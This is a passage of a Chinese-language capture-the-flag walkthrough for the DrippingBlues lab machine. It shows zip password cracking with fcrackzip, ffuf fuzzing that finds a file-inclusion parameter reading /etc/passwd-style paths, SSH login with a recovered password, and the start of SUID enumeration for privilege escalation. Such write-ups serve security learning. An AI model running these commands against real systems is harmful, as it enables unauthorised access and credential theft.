+</span></span><span class="line"><span class="cl">go <span class="k">for</span> this lyrics:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">count the n words and put them side by side <span class="k">then</span> md5sum it
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ie, hellohellohellohello &gt;&gt; md5sum hellohellohellohello
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">it<span class="err">&#39;</span>s the password of ssh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.144/etc/dripispowerful.html
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+</span></span><span class="line"><span class="cl">&lt;hr&gt;
+</span></span><span class="line"><span class="cl">&lt;address&gt;Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> Server at 172.16.86.144 Port 80&lt;/address&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个文件提示我们去计算歌词的单词然后md5值作为ssh的登录密码，看起来不太现实，因为这个歌词很长，先暂时搁置；第二个文件访问不到，看来etc目录可能是操作系统的etc目录。</p>
+<h2 id="3-exploit">3. Exploit</h2>
+<p>截止到目前为止，我们拿到的数据有一个respectmydrip.zip文件，但是带密码；另外有一个ssh密码的提示信息。</p>
+<h3 id="1-zip-crack">1. Zip Crack</h3>
+<p>首先尝试破解respectmydrip.zip文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> <span class="m">072528035</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ unzip respectmydrip.zip
+</span></span><span class="line"><span class="cl">Archive:  respectmydrip.zip
+</span></span><span class="line"><span class="cl"><span class="o">[</span>respectmydrip.zip<span class="o">]</span> respectmydrip.txt password:
+</span></span><span class="line"><span class="cl"> extracting: respectmydrip.txt
+</span></span><span class="line"><span class="cl">  inflating: secret.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ll
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> v4ler1an v4ler1an <span class="m">4096</span> Nov  <span class="m">8</span> 21:19 reports
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> v4ler1an v4ler1an   <span class="m">20</span> Sep <span class="m">19</span>  <span class="m">2021</span> respectmydrip.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> v4ler1an v4ler1an  <span class="m">471</span> Sep <span class="m">19</span>  <span class="m">2021</span> respectmydrip.zip
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> v4ler1an v4ler1an  <span class="m">171</span> Sep <span class="m">19</span>  <span class="m">2021</span> secret.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还真被我们爆破了这个压缩包。解压secret.zip提示还有密码，继续爆破尝试失败，密码也失败。查看respectmydrip.txt：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat cat respectmydrip.txt
+</span></span><span class="line"><span class="cl">just focus on <span class="s2">&#34;drip&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看来是个提示。</p>
+<h3 id="2-url-parameters-fuzz">2. URL Parameters Fuzz</h3>
+<p>在前面的web directory的scan时，还有一个index.php的路径，我们可以尝试关注下这个文件。该文件处理的是web的主页面：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png"
+        title="image-20231109103704968" /></p>
+<p>我们在前面的robot.txt中还有一个<code>/etc/dripispowerful.html</code>访问不到，那么可以尝试能不能通过index.php来看下这个文件。</p>
+<p>对index.php进行一个get方法的parameters的fuzz看看能不能传递参数，如果包含一个文件包含漏洞，那么就可以访问<code>/etc/dripispowerful.html</code>文件了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan/wfuzz<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ffuf -ic -c -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <span class="s1">&#39;http://172.16.86.144/index.php?FUZZ=/etc/passwd&#39;</span> -fs <span class="m">138</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://172.16.86.144/index.php?FUZZ<span class="o">=</span>/etc/passwd
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response size: <span class="m">138</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">drip                    <span class="o">[</span>Status: 200, Size: 3032, Words: 50, Lines: 58, Duration: 85ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>220547/220547<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">1626</span> req/sec :: Duration: <span class="o">[</span>0:02:49<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功发现drip参数，突然发现刚好是<code>respectmydrip.txt</code>文件中的提示信息。。。</p>
+<p>使用drip参数访问一下<code>/etc/dripispowerful.html</code>文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan/wfuzz<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.144/index.php?drip<span class="o">=</span>/etc/dripispowerful.html
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;style&gt;
+</span></span><span class="line"><span class="cl">body <span class="o">{</span>
+</span></span><span class="line"><span class="cl">background-image: url<span class="o">(</span><span class="s1">&#39;drippin.jpg&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">background-repeat: no-repeat<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@font-face <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    font-family: Segoe<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    src: url<span class="o">(</span><span class="s1">&#39;segoeui.ttf&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.mainfo <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  text-align: center<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  border: 1px solid <span class="c1">#000000;</span>
+</span></span><span class="line"><span class="cl">  font-family: <span class="s1">&#39;Segoe&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  padding: 5px<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  background-color: <span class="c1">#ffffff;</span>
+</span></span><span class="line"><span class="cl">  margin-top: 300px<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.emoji <span class="o">{</span>
+</span></span><span class="line"><span class="cl">	width: 32px<span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">}</span>
+</span></span><span class="line"><span class="cl">&lt;/style&gt;
+</span></span><span class="line"><span class="cl">password is:
+</span></span><span class="line"><span class="cl">imdrippinbiatch
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">driftingblues is hacked again so it<span class="err">&#39;</span>s now called drippingblues. :D hahaha
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">by
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">travisscott <span class="p">&amp;</span> thugger
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中有一个password，接下来就用这个password和之前的两个用户名去尝试ssh登录。</p>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<h3 id="1-user-login">1. User Login</h3>
+<p>分别使用<code>travisscott/imdrippinbiatch</code>和<code>thugger/imdrippinbiatch</code>尝试登录ssh，发现第二个可以成功登录，并且可以读取到一个user.txt：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan/wfuzz<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh thugger@172.16.86.144
+</span></span><span class="line"><span class="cl">thugger@172.16.86.144<span class="s1">&#39;s password:
+</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Management:     https://landscape.canonical.com
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * Support:        https://ubuntu.com/advantage
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">263 updates can be installed immediately.
+</span></span></span><span class="line"><span class="cl"><span class="s1">30 of these updates are security updates.
+</span></span></span><span class="line"><span class="cl"><span class="s1">To see these additional updates run: apt list --upgradable
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">New release &#39;</span>22.04.3 LTS<span class="s1">&#39; available.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Run &#39;</span><span class="k">do</span>-release-upgrade<span class="err">&#39;</span> to upgrade to it.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your Hardware Enablement Stack <span class="o">(</span>HWE<span class="o">)</span> is supported <span class="k">until</span> April 2025.
+</span></span><span class="line"><span class="cl">*** System restart required ***
+</span></span><span class="line"><span class="cl">Last login: Wed Nov  <span class="m">8</span> 17:05:31 <span class="m">2023</span> from 172.16.86.138
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music	Pictures  Public  Templates  Videos  user.txt
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>thugger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>thugger<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>thugger<span class="o">)</span>
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music	Pictures  Public  Templates  Videos  user.txt
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ cat user.txt
+</span></span><span class="line"><span class="cl">5C50FC503A2ABE93B4C5EE3425496521thugger@drippingblues:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>感觉是个md5，尝试去碰撞一下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png"
+        title="image-20231109110742350" /></p>
+<h3 id="2-privilege-escalation">2. Privilege Escalation</h3>
+<p>接下来就是想办法去提权，内核版本比较高，而且环境中没有make、gcc等编译工具：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thugger@drippingblues:~$ uname -a
+</span></span><span class="line"><span class="cl">Linux drippingblues 5.11.0-34-generic <span class="c1">#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ cat /proc/version
+</span></span><span class="line"><span class="cl">Linux version 5.11.0-34-generic <span class="o">(</span>buildd@lgw01-amd64-001<span class="o">)</span> <span class="o">(</span>gcc <span class="o">(</span>Ubuntu 9.3.0-17ubuntu1~20.04<span class="o">)</span> 9.3.0, GNU ld <span class="o">(</span>GNU Binutils <span class="k">for</span> Ubuntu<span class="o">)</span> 2.34<span class="o">)</span> <span class="c1">#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ gcc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Command <span class="s1">&#39;gcc&#39;</span> not found, but can be installed with:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">apt install gcc
+</span></span><span class="line"><span class="cl">Please ask your administrator.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">thugger@drippingblues:~$ make
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Command <span class="s1">&#39;make&#39;</span> not found, but can be installed with:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">apt install make        <span class="c1"># version 4.2.1-1.2, or</span>
+</span></span><span class="line"><span class="cl">apt install make-guile  <span class="c1"># version 4.2.1-1.2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ask your administrator to install one of them.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是发现了python3环境:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thugger@drippingblues:~$ python3
+</span></span><span class="line"><span class="cl">Python 3.8.10 <span class="o">(</span>default, May <span class="m">26</span> 2023, 14:05:08<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>GCC 9.4.0<span class="o">]</span> on linux
+</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;help&#34;</span>, <span class="s2">&#34;copyright&#34;</span>, <span class="s2">&#34;credits&#34;</span> or <span class="s2">&#34;license&#34;</span> <span class="k">for</span> more information.
+</span></span><span class="line"><span class="cl">&gt;&gt;&gt; exit<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在寻找SUID程序时，发现了pkexec：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">thugger@drippingblues:~$ find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">72712</span> Kas <span class="m">24</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/chfn
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44808</span> Kas <span class="m">24</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">72072</span> Kas <span class="m">24</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">47480</span> Şub <span class="m">21</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40496</span> Kas <span class="m">24</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">59976</span> Kas <span class="m">24</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">55672</span> Şub <span class="m">21</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">232416</span> Nis  <span class="m">3</span>  <span class="m">2023</span> /snap/core22/864/usr/bin/sudo
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">35192</span> Şub <span class="m">21</span>  <span class="m">2022</span> /snap/core22/864/usr/bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root systemd-resolve <span class="m">35112</span> Eki <span class="m">25</span>  <span class="m">2022</span> /snap/core22/864/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">338536</span> Tem <span class="m">19</span> 22:41 /snap/core22/864/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">111080</span> Ağu <span class="m">10</span>  <span class="m">2021</span> /snap/snapd/12883/usr/lib/snapd/snap-confine
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">43088</span> Eyl <span class="m">16</span>  <span class="m">2020</span> /snap/core18/2796/bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">64424</span> Haz <span class="m">28</span>  <span class="m">2019</span> /snap/core18/2796/bin/ping
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44664</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/bin/su
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">26696</span> Eyl <span class="m">16</span>  <span class="m">2020</span> /snap/core18/2796/bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">76496</span> Kas <span class="m">29</span>  <span class="m">2022</span> /snap/core18/2796/usr/bin/chfn
